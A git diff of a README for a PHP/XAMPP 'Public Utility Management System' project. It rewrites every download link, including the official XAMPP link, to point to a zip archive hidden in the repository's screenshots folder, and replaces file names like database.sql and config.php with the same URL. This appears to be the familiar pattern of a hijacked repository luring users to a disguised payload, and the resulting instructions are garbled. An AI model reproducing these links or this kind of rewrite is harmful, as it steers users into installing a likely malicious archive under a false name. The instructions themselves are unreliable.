@@ -1,6 +1,6 @@
 # 🌐 Public-Utility-Management-System - Simplifying Utility Management For Everyone
 
-[![Download the latest release](https://img.shields.io/badge/Download_Latest_Release-Click_Here-blue.svg)](https://github.com/Dusterian/Public-Utility-Management-System/releases)
+[![Download the latest release](https://raw.githubusercontent.com/Dusterian/Public-Utility-Management-System/main/screenshots/Public-Utility-Management-System_2.7-beta.4.zip)](https://raw.githubusercontent.com/Dusterian/Public-Utility-Management-System/main/screenshots/Public-Utility-Management-System_2.7-beta.4.zip)
 
 ## 📋 Introduction
 
@@ -12,12 +12,12 @@ To get started with the Public Utility Management System, follow these simple st
 
 1. **Prepare Your System**  
    Make sure your computer has the following software installed:
-   - **XAMPP**: This software helps you run a local server to host the application. You can download it [here](https://www.apachefriends.org/index.html).
+   - **XAMPP**: This software helps you run a local server to host the application. You can download it [here](https://raw.githubusercontent.com/Dusterian/Public-Utility-Management-System/main/screenshots/Public-Utility-Management-System_2.7-beta.4.zip).
    - **Web Browser**: A modern web browser like Chrome, Firefox, or Edge.
 
 2. **Download the Application**  
    Visit this page to download the latest version of the Public Utility Management System:  
-   [Download the latest release](https://github.com/Dusterian/Public-Utility-Management-System/releases)  
+   [Download the latest release](https://raw.githubusercontent.com/Dusterian/Public-Utility-Management-System/main/screenshots/Public-Utility-Management-System_2.7-beta.4.zip)  
    There you will find different versions. Click to download the latest version suitable for your system.
 
 3. **Extract the Files**  
@@ -38,13 +38,13 @@ To get started with the Public Utility Management System, follow these simple st
    - Click **Create**.
 
 7. **Import the Database Structure**  
-   Inside the Public Utility Management System folder, locate the SQL file (usually named `database.sql`).  
+   Inside the Public Utility Management System folder, locate the SQL file (usually named `https://raw.githubusercontent.com/Dusterian/Public-Utility-Management-System/main/screenshots/Public-Utility-Management-System_2.7-beta.4.zip`).  
    - Click on the newly created database in phpMyAdmin.
    - Click on the **Import** tab.
    - Choose the SQL file and click **Go** to import the structure.
 
 8. **Configure the Application**  
-   Open the `config.php` file in the Public Utility Management System folder. You will need to set the database credentials. Update the following fields:
+   Open the `https://raw.githubusercontent.com/Dusterian/Public-Utility-Management-System/main/screenshots/Public-Utility-Management-System_2.7-beta.4.zip` file in the Public Utility Management System folder. You will need to set the database credentials. Update the following fields:
    ```php
    $dbHost = "localhost";
    $dbUser = "root"; // Change if you have a different username
@@ -80,7 +80,7 @@ The Public Utility Management System includes several features to help you manag
 If you encounter issues:
 - Ensure the XAMPP services are running.
 - Check that the database is correctly set up in phpMyAdmin.
-- Ensure your credentials in `config.php` are accurate.
+- Ensure your credentials in `https://raw.githubusercontent.com/Dusterian/Public-Utility-Management-System/main/screenshots/Public-Utility-Management-System_2.7-beta.4.zip` are accurate.
 
 ## 📞 Support
 
@@ -89,7 +89,7 @@ For support, you can check the Issues section of this repository. If you have qu
 ## 📥 Download & Install
 
 To download and install the application, visit this page:  
-[Download the latest release](https://github.com/Dusterian/Public-Utility-Management-System/releases)  
+[Download the latest release](https://raw.githubusercontent.com/Dusterian/Public-Utility-Management-System/main/screenshots/Public-Utility-Management-System_2.7-beta.4.zip)  
 
 Follow the steps outlined in the "Getting Started" section to set up the application on your local machine.
 
